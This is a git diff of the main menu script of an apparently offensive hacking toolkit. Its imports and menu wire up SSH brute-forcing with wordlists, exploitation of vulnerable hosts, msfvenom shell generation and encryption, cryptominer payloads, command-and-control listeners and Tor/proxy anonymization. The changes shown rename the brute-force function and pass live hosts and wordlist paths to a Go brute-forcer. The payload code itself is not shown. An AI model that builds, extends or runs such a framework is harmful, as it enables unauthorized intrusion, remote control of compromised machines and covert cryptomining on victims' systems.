@@ -13,7 +13,6 @@ from globals import (
     pause_event,
     stop_event,
 )
-
 from modules.proxy_handler import (
     load_proxies,
     test_proxies,
@@ -22,28 +21,24 @@ from modules.proxy_handler import (
     load_checked_proxies,
     clear_proxies,
 )
-
 from modules.host_handler import (
     load_hosts,
     load_ip_ranges,
     test_hosts,
     load_previous_hosts,
 )
-
 from modules.scanner import scan_hosts, show_results, clear_results
 from modules.exploit import identify_vulnerable_hosts, exploit_vulnerable_hosts
 from modules.utils import clear_all_chunks, split_large_csvs, ensure_wordlists, ensure_valid_hosts
-from modules.bruteforce import load_wordlists, python_bruteforce_ssh
+from modules.bruteforce import load_wordlists, bruteforce_ssh
 from modules.config_handler import configure_settings
 from modules.shell_generator import generate_msfvenom_shell, encrypt_generated_shell, list_payloads
 from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
 from modules.command_control import start_listener, c2_interface, start_apache_server, stop_listeners
 from modules.tor_handler import start_tor, renew_tor_ip, stop_tor
-from modules.go_bruteforce import run_golang_bruteforce
-
 import os
 import keyboard
-
+from modules.go_bruteforce import run_golang_bruteforce
 
 def main_menu():
     while True:
@@ -75,7 +70,6 @@ def main_menu():
         print("25.) Exit")
 
         choice = input("Enter your choice: ")
-
         if choice == "1":
             add_proxy_sources()
         elif choice == "2":
@@ -135,14 +129,15 @@ def main_menu():
             bruteforce_choice = input("Enter your choice: ")
 
             if bruteforce_choice == "1":
-                python_bruteforce_ssh(targets, usernames, passwords, max_threads=5)
+                bruteforce_ssh(targets, usernames, passwords, max_threads=5)
             elif bruteforce_choice == "2":
-                run_golang_bruteforce()
+                run_golang_bruteforce(global_live_hosts, "wordlists/ssh_usernames.txt", "wordlists/ssh_passwords.txt", 5)
             elif bruteforce_choice == "3":
                 continue
             else:
                 print("[ERROR] Invalid choice. Please enter 1, 2, or 3.")
         elif choice == "19":
+            # Run Golang SSH Bruteforce with SOCKS5 proxies
             if not global_live_hosts:
                 print("[ERROR] No valid live hosts found.")
                 continue
@@ -206,7 +201,6 @@ def main_menu():
             stop_listeners()
             stop_tor()
             break
-
 
 def setup_keyboard_controls():
     keyboard.add_hotkey("F5", lambda: pause_event.set() if not pause_event.is_set() else pause_event.clear())
